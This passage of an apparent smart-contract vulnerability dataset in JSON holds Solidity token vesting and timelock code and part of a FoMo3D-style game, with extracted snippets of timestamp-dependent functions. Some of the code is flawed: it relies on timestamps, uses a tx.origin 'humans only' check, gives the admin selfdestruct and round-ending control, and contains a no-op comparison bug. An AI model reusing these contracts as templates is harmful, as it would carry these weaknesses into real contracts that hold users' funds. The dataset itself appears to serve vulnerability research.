require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint256 public releaseTime;\n constructor(\n ERC20Basic _token,\n address _beneficiary,\n uint256 _releaseTime\n )\n public\n {\n require(_releaseTime > block.timestamp);\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(block.timestamp >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\npragma solidity ^0.4.23;\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\ncontract NokuCustomERC20 is NokuCustomToken, DetailedERC20, MintableToken, BurnableToken {\n using SafeMath for uint256;\n event LogNokuCustomERC20Created(\n address indexed caller,\n string indexed name,\n string indexed symbol,\n uint8 decimals,\n uint256 transferableFromBlock,\n uint256 lockEndBlock,\n address pricingPlan,\n address serviceProvider\n );\n event LogMintingFeeEnabledChanged(address indexed caller, bool indexed mintingFeeEnabled);\n event LogInformationChanged(address indexed caller, string name, string symbol);\n event LogTransferFeePaymentFinished(address indexed caller);\n event LogTransferFeePercentageChanged(address indexed caller, uint256 indexed transferFeePercentage);\n bool public mintingFeeEnabled;\n uint256 public transferableFromBlock;\n uint256 public lockEndBlock;\n mapping (address => uint256) public initiallyLockedBalanceOf;\n uint256 public transferFeePercentage;\n bool public transferFeePaymentFinished;\n TokenTimelock public timelock;\n TokenVesting public vesting;\n bytes32 public constant BURN_SERVICE_NAME = \"NokuCustomERC20.burn\";\n bytes32 public constant MINT_SERVICE_NAME = \"NokuCustomERC20.mint\";\n bytes32 public constant TIMELOCK_SERVICE_NAME = \"NokuCustomERC20.timelock\";\n bytes32 public constant VESTING_SERVICE_NAME = \"NokuCustomERC20.vesting\";\n modifier canTransfer(address _from, uint _value) {\n require(block.number >= transferableFromBlock, \"token not transferable\");\n if (block.number < lockEndBlock) {\n uint256 locked = lockedBalanceOf(_from);\n if (locked > 0) {\n uint256 newBalance = balanceOf(_from).sub(_value);\n require(newBalance >= locked, \"_value exceeds locked amount\");\n }\n }\n _;\n }\n constructor(\n string _name,\n string _symbol,\n uint8 _decimals,\n uint256 _transferableFromBlock,\n uint256 _lockEndBlock,\n address _pricingPlan,\n address _serviceProvider\n )\n NokuCustomToken(_pricingPlan, _serviceProvider)\n DetailedERC20(_name, _symbol, _decimals) public\n {\n require(bytes(_name).length > 0, \"_name is empty\");\n require(bytes(_symbol).length > 0, \"_symbol is empty\");\n require(_lockEndBlock >= _transferableFromBlock, \"_lockEndBlock lower than _transferableFromBlock\");\n transferableFromBlock = _transferableFromBlock;\n lockEndBlock = _lockEndBlock;\n mintingFeeEnabled = true;\n emit LogNokuCustomERC20Created(\n msg.sender,\n _name,\n _symbol,\n _decimals,\n _transferableFromBlock,\n _lockEndBlock,\n _pricingPlan,\n _serviceProvider\n );\n }\n function setMintingFeeEnabled(bool _mintingFeeEnabled) public onlyOwner returns(bool successful) {\n require(_mintingFeeEnabled != mintingFeeEnabled, \"_mintingFeeEnabled == mintingFeeEnabled\");\n mintingFeeEnabled = _mintingFeeEnabled;\n emit LogMintingFeeEnabledChanged(msg.sender, _mintingFeeEnabled);\n return true;\n }\n function setInformation(string _name, string _symbol) public onlyOwner returns(bool successful) {\n require(bytes(_name).length > 0, \"_name is empty\");\n require(bytes(_symbol).length > 0, \"_symbol is empty\");\n name = _name;\n symbol = _symbol;\n emit LogInformationChanged(msg.sender, _name, _symbol);\n return true;\n }\n function finishTransferFeePayment() public onlyOwner returns(bool finished) {\n require(!transferFeePaymentFinished, \"transfer fee finished\");\n transferFeePaymentFinished = true;\n emit LogTransferFeePaymentFinished(msg.sender);\n return true;\n }\n function setTransferFeePercentage(uint256 _transferFeePercentage) public onlyOwner {\n require(0 <= _transferFeePercentage && _transferFeePercentage <= 100, \"_transferFeePercentage not in [0, 100]\");\n require(_transferFeePercentage != transferFeePercentage, \"_transferFeePercentage equal to current value\");\n transferFeePercentage = _transferFeePercentage;\n emit LogTransferFeePercentageChanged(msg.sender, _transferFeePercentage);\n }\n function lockedBalanceOf(address _to) public view returns(uint256 locked) {\n uint256 initiallyLocked = initiallyLockedBalanceOf[_to];\n if (block.number >= lockEndBlock) return 0;\n else if (block.number <= transferableFromBlock) return initiallyLocked;\n uint256 releaseForBlock = initiallyLocked.div(lockEndBlock.sub(transferableFromBlock));\n uint256 released = block.number.sub(transferableFromBlock).mul(releaseForBlock);\n return initiallyLocked.sub(released);\n }\n function transferFee(uint256 _value) public view returns(uint256 usageFee) {\n return _value.mul(transferFeePercentage).div(100);\n }\n function freeTransfer() public view returns (bool isTransferFree) {\n return transferFeePaymentFinished || transferFeePercentage == 0;\n }\n function transfer(address _to, uint256 _value) canTransfer(msg.sender, _value) public returns(bool transferred) {\n if (freeTransfer()) {\n return super.transfer(_to, _value);\n }\n else {\n uint256 usageFee = transferFee(_value);\n uint256 netValue = _value.sub(usageFee);\n bool feeTransferred = super.transfer(owner, usageFee);\n bool netValueTransferred = super.transfer(_to, netValue);\n return feeTransferred && netValueTransferred;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) canTransfer(_from, _value) public returns(bool transferred) {\n if (freeTransfer()) {\n return super.transferFrom(_from, _to, _value);\n }\n else {\n uint256 usageFee = transferFee(_value);\n uint256 netValue = _value.sub(usageFee);\n bool feeTransferred = super.transferFrom(_from, owner, usageFee);\n bool netValueTransferred = super.transferFrom(_from, _to, netValue);\n return feeTransferred && netValueTransferred;\n }\n }\n function burn(uint256 _amount) public canBurn {\n require(_amount > 0, \"_amount is zero\");\n super.burn(_amount);\n require(pricingPlan.payFee(BURN_SERVICE_NAME, _amount, msg.sender), \"burn fee failed\");\n }\n function mint(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {\n require(_to != 0, \"_to is zero\");\n require(_amount > 0, \"_amount is zero\");\n super.mint(_to, _amount);\n if (mintingFeeEnabled) {\n require(pricingPlan.payFee(MINT_SERVICE_NAME, _amount, msg.sender), \"mint fee failed\");\n }\n return true;\n }\n function mintLocked(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {\n initiallyLockedBalanceOf[_to] = initiallyLockedBalanceOf[_to].add(_amount);\n return mint(_to, _amount);\n }\n function mintTimelocked(address _to, uint256 _amount, uint256 _releaseTime) public onlyOwner canMint\n returns(bool minted)\n {\n require(timelock == address(0), \"TokenTimelock already activated\");\n timelock = new TokenTimelock(this, _to, _releaseTime);\n minted = mint(timelock, _amount);\n require(pricingPlan.payFee(TIMELOCK_SERVICE_NAME, _amount, msg.sender), \"timelock fee failed\");\n }\n function mintVested(address _to, uint256 _amount, uint256 _startTime, uint256 _duration) public onlyOwner canMint\n returns(bool minted)\n {\n require(vesting == address(0), \"TokenVesting already activated\");\n vesting = new TokenVesting(_to, _startTime, 0, _duration, true);\n minted = mint(vesting, _amount);\n require(pricingPlan.payFee(VESTING_SERVICE_NAME, _amount, msg.sender), \"vesting fee failed\");\n }\n function releaseVested() public returns(bool released) {\n require(vesting != address(0), \"TokenVesting not activated\");\n vesting.release(this);\n return true;\n }\n function revokeVested() public onlyOwner returns(bool revoked) {\n require(vesting != address(0), \"TokenVesting not activated\");\n vesting.revoke(this);\n return true;\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract NokuCustomService is Pausable {\n using AddressUtils for address;\n event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);\n NokuPricingPlan public pricingPlan;\n constructor(address _pricingPlan) internal {\n require(_pricingPlan.isContract(), \"_pricingPlan is not contract\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n }\n function setPricingPlan(address _pricingPlan) public onlyOwner {\n require(_pricingPlan.isContract(), \"_pricingPlan is not contract\");\n require(NokuPricingPlan(_pricingPlan) != pricingPlan, \"_pricingPlan equal to current\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n emit LogPricingPlanChanged(msg.sender, _pricingPlan);\n }\n}\ncontract NokuCustomERC20Service is NokuCustomService {\n event LogNokuCustomERC20ServiceCreated(address caller, address indexed pricingPlan);\n uint256 public constant CREATE_AMOUNT = 1 * 10**18;\n uint8 public constant DECIMALS = 18;\n bytes32 public constant CUSTOM_ERC20_CREATE_SERVICE_NAME = \"NokuCustomERC20.create\";\n constructor(address _pricingPlan) NokuCustomService(_pricingPlan) public {\n emit LogNokuCustomERC20ServiceCreated(msg.sender, _pricingPlan);\n }\n function createCustomToken(string _name, string _symbol, uint8 ) public returns(NokuCustomERC20 customToken) {\n customToken = new NokuCustomERC20(\n _name,\n _symbol,\n DECIMALS,\n block.number,\n block.number,\n pricingPlan,\n owner\n );\n customToken.transferOwnership(msg.sender);\n require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n }\n function createCustomToken(\n string _name,\n string _symbol,\n uint8 ,\n uint256 transferableFromBlock,\n uint256 lockEndBlock\n )\n public returns(NokuCustomERC20 customToken)\n {\n customToken = new NokuCustomERC20(\n _name,\n _symbol,\n DECIMALS,\n transferableFromBlock,\n lockEndBlock,\n pricingPlan,\n owner\n );\n customToken.transferOwnership(msg.sender);\n require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n }\n}",
  "extract_feature": [
    "function release() public {\nrequire(block.timestamp >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}",
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}",
    "function lockedBalanceOf(address _to) public view returns(uint256 locked) {\nuint256 initiallyLocked = initiallyLockedBalanceOf[_to];\nif (block.number >= lockEndBlock) return 0;\nelse if (block.number <= transferableFromBlock) return initiallyLocked;\nuint256 releaseForBlock = initiallyLocked.div(lockEndBlock.sub(transferableFromBlock));\nuint256 released = block.number.sub(transferableFromBlock).mul(releaseForBlock);\nreturn initiallyLocked.sub(released);\n}",
    "function createCustomToken(string _name, string _symbol, uint8 ) public returns(NokuCustomERC20 customToken) {\ncustomToken = new NokuCustomERC20(\n_name,\n_symbol,\nDECIMALS,\nblock.number,\nblock.number,\npricingPlan,\nowner\n);\ncustomToken.transferOwnership(msg.sender);\nrequire(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b74"
  },
  "filename": "3266.sol",
  "content": "pragma solidity ^0.4.24;\ncontract PCKevents {\n event onNewName\n (\n uint256 indexed playerID,\n address indexed playerAddress,\n bytes32 indexed playerName,\n bool isNewPlayer,\n uint256 affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 amountPaid,\n uint256 timeStamp\n );\n event onEndTx\n (\n uint256 compressedData,\n uint256 compressedIDs,\n bytes32 playerName,\n address playerAddress,\n uint256 ethIn,\n uint256 keysBought,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount,\n uint256 potAmount,\n uint256 airDropPot\n );\n event onWithdraw\n (\n uint256 indexed playerID,\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 timeStamp\n );\n event onWithdrawAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onBuyAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethIn,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onReLoadAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onAffiliatePayout\n (\n uint256 indexed affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 indexed roundID,\n uint256 indexed buyerID,\n uint256 amount,\n uint256 timeStamp\n );\n event onPotSwapDeposit\n (\n uint256 roundID,\n uint256 amountAddedToPot\n );\n}\ncontract modularKey is PCKevents {}\ncontract PlayCoinKey is modularKey {\n using SafeMath for *;\n using NameFilter for string;\n using PCKKeysCalcLong for uint256;\n otherPCK private otherPCK_;\n PlayCoinGodInterface constant private PCGod = PlayCoinGodInterface(0x6f93Be8fD47EBb62F54ebd149B58658bf9BaCF4f);\n ProForwarderInterface constant private Pro_Inc = ProForwarderInterface(0x97354A7281693b7C93f6348Ba4eC38B9DDd76D6e);\n PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x47D1c777f1853cac97E6b81226B1F5108FBD7B81);\n string constant public name = \"PlayCoin Key\";\n string constant public symbol = \"PCK\";\n uint256 private rndExtra_ = 15 minutes;\n uint256 private rndGap_ = 15 minutes;\n uint256 constant private rndInit_ = 12 hours;\n uint256 constant private rndInc_ = 30 seconds;\n uint256 constant private rndMax_ = 6 hours;\n uint256 constant private rndMin_ = 10 minutes;\n uint256 public rndReduceThreshold_ = 10e18;\n bool public closed_ = false;\n address private admin = msg.sender;\n uint256 public airDropPot_;\n uint256 public airDropTracker_ = 0;\n uint256 public rID_;\n mapping (address => uint256) public pIDxAddr_;\n mapping (bytes32 => uint256) public pIDxName_;\n mapping (uint256 => PCKdatasets.Player) public plyr_;\n mapping (uint256 => mapping (uint256 => PCKdatasets.PlayerRounds)) public plyrRnds_;\n mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;\n mapping (uint256 => PCKdatasets.Round) public round_;\n mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;\n mapping (uint256 => PCKdatasets.TeamFee) public fees_;\n mapping (uint256 => PCKdatasets.PotSplit) public potSplit_;\n constructor()\n public\n {\n fees_[0] = PCKdatasets.TeamFee(30,6);\n fees_[1] = PCKdatasets.TeamFee(43,0);\n fees_[2] = PCKdatasets.TeamFee(56,10);\n fees_[3] = PCKdatasets.TeamFee(43,8);\n potSplit_[0] = PCKdatasets.PotSplit(15,10);\n potSplit_[1] = PCKdatasets.PotSplit(25,0);\n potSplit_[2] = PCKdatasets.PotSplit(20,20);\n potSplit_[3] = PCKdatasets.PotSplit(30,10);\n }\n modifier isActivated() {\n require(activated_ == true, \"its not ready yet. check ?eta in discord\");\n _;\n }\n modifier isRoundActivated() {\n require(round_[rID_].ended == false, \"the round is finished\");\n _;\n }\n modifier isHuman() {\n address _addr = msg.sender;\n uint256 _codeLength;\n require(msg.sender == tx.origin, \"sorry humans only\");\n _;\n }\n modifier isWithinLimits(uint256 _eth) {\n require(_eth >= 1000000000, \"pocket lint: not a valid currency\");\n require(_eth <= 100000000000000000000000, \"no vitalik, no\");\n _;\n }\n modifier onlyAdmins() {\n require(msg.sender == admin, \"onlyAdmins failed - msg.sender is not an admin\");\n _;\n }\n function kill () onlyAdmins() public {\n require(round_[rID_].ended == true && closed_ == true, \"the round is active or not close\");\n selfdestruct(admin);\n }\n function getRoundStatus() isActivated() public view returns(uint256, bool){\n return (rID_, round_[rID_].ended);\n }\n function setThreshold(uint256 _threshold) onlyAdmins() public returns(uint256) {\n rndReduceThreshold_ = _threshold;\n return rndReduceThreshold_;\n }\n function setEnforce(bool _closed) onlyAdmins() public returns(bool, uint256, bool) {\n closed_ = _closed;\n if( !closed_ && round_[rID_].ended == true && activated_ == true ){\n nextRound();\n }\n else if( closed_ && round_[rID_].ended == false && activated_ == true ){\n round_[rID_].end = now - 1;\n }\n return (closed_, rID_, now > round_[rID_].end);\n }\n function()\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);\n }\n function buyXid(uint256 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affCode, _team, _eventData_);\n }\n function buyXaddr(address _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function buyXname(bytes32 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affCode, _team, _eth, _eventData_);\n }\n function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function withdraw()\n isActivated()\n isHuman()\n public\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _eth;\n if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n PCKdatasets.EventReturns memory _eventData_;\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onWithdrawAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n } else {\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n emit PCKevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);\n }\n }\n function registerNameXID(string _nameString, uint256 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXaddr(string _nameString, address _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXname(string _nameString, bytes32 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function getBuyPrice()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );\n else\n return ( 75000000000000 );\n }\n function getTimeLeft()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now < round_[_rID].end)\n if (_now > round_[_rID].strt + rndGap_)\n return( (round_[_rID].end).sub(_now) );\n else\n return( (round_[_rID].strt + rndGap_).sub(_now) );\n else\n return(0);\n }\n function getPlayerVaults(uint256 _pID)\n public\n view\n returns(uint256 ,uint256, uint256)\n {\n uint256 _rID = rID_;\n if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n if (round_[_rID].plyr == _pID)\n {\n return\n (\n (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n }\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff\n );\n }\n }\n function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)\n private\n view\n returns(uint256)\n {\n return( ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000) );\n }\n function getCurrentRoundInfo()\n public\n view\n returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n return\n (\n round_[_rID].ico,\n _rID,\n round_[_rID].keys,\n round_[_rID].end,\n round_[_rID].strt,\n round_[_rID].pot,\n (round_[_rID].team + (round_[_rID].plyr * 10)),\n plyr_[round_[_rID].plyr].addr,\n plyr_[round_[_rID].plyr].name,\n rndTmEth_[_rID][0],\n rndTmEth_[_rID][1],\n rndTmEth_[_rID][2],\n rndTmEth_[_rID][3],\n airDropTracker_ + (airDropPot_ * 1000)\n );\n }\n function getPlayerInfoByAddress(address _addr)\n public\n view\n returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n if (_addr == address(0))\n {\n _addr == msg.sender;\n }\n uint256 _pID = pIDxAddr_[_addr];\n return\n (\n _pID,\n plyr_[_pID].name,\n plyrRnds_[_pID][_rID].keys,\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff,\n plyrRnds_[_pID][_rID].eth\n );\n }\n function buyCore(uint256 _pID, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > (round_[_rID].strt + rndGap_) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n core(_rID, _pID, msg.value, _affID, _team, _eventData_);\n } else {\n if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ){\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onBuyAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n msg.value,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);\n }\n }\n function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > ( round_[_rID].strt + rndGap_ ) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);\n core(_rID, _pID, _eth, _affID, _team, _eventData_);\n } else if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ) {\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onReLoadAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n }\n function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n if 